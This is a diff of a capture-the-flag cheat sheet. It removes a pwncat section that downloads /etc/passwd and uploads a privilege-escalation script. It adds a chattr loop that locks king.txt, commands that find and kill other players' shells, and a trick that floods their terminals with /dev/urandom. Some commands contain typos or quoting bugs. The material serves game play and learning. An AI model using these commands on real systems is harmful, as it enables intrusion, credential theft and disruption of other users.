-<h2>With PWNCAT</h2>
+<h2 id="king">King.txt</h2>
 
+what i do is something like this!
+```
+bash -c "while true; do echo itsnexn> king.txt; chatter +ia 'king.txt'; sleep 1; done"
+```
 
-I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
+lets simplify it!
 
-<b>hacked-account@victim ~/</b><code></code>
+```shell
+#!/bin/bash
+while true; do
+    chattr -ai "king.txt"
+    echo -e "username" > /root/king.txt
+    chattr +ia "king.txt"
+done
+```
 
-Press<b>"CTRL+D"</b>
+to find others shell:
+```
+ps -aef --forest
+```
+and kill:
 
-<b>pform@local~: </b><code>download /etc/passwd</code>
+```
+kill -9 pid
+```
 
-<b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py</code>
+<h2 id="tips">Random Tips and Tricks</h2>
+<h3 id="changeIp">Change IP on all scripts in a folder</h3>
 
-Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
+Go inside your shell folder:
+```
+export NEWIP="your ip"
+grep -rl 10.10.10.10 myfile.sh | xargs sed -i 's/10.10.10.10/$NEWIP/g'
+```
 
-<b>hacked-account@victim ~/</b><code></code>
+<h3 id="talk">Talk with other players inside machine!</h3>
 
+#### Using Wall:
+```
+wall "something"
+```
+
+#### Using `/dev/pts`
+for this you should find the pts number from `ps aux` or `ps -aef --forest` after that you can easily do:
+```
+echo "something" > /dev/pts/ # and the number
+```
+
+```
+cat /dev/urandom > /dev/pts/ # and the number
+```
+
+> HACK THE PLANET | pform-se and Itsnexn
